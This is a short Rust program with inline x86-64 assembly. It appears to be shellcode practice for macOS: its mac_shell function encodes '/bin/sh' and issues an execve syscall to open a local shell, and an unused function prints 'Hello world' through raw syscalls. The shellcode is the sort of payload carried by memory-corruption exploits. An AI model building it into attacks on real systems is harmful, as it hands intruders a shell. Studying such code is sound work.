#![no_std]
#![no_main]
#![feature(asm)]

//This is required to link against Libc seems to fail without it
#[cfg(any(unix, macos))]
#[link(name = "c")]
extern "C" {}

#[no_mangle]
#[panic_handler]
fn panic(_info: &core::panic::PanicInfo) -> ! {
    loop {}
}

#[no_mangle]
unsafe fn mac_shell() {
    const payload: u64 = 0x68732f6e69622f_u64;
    asm!("
    xor  rax, rax
    cdq
    push rax
    ");
    asm!("
         push rdi
         push rsp
         pop  rdi
         ", inout("rdi") payload => _,);
    asm!("
    xor  rsi, rsi
    mov  al, 0x2
    ror  rax, 0x28
    mov  al, 0x3b
    syscall");
}



unsafe fn hello() {
    let buf = "Hello world\n";
    asm!(
    "syscall",
    in("rax") 0x2000004,
    in("rdi") 1,
    in("rsi") buf.as_ptr(),
    in("rdx") buf.len(),
    );
    asm!(
    "syscall",
    in("rax") 0x2000001,
    in("rdi") 0
    );
}

#[no_mangle]
pub extern "C" fn main() {
    unsafe {
        mac_shell();
    }
}
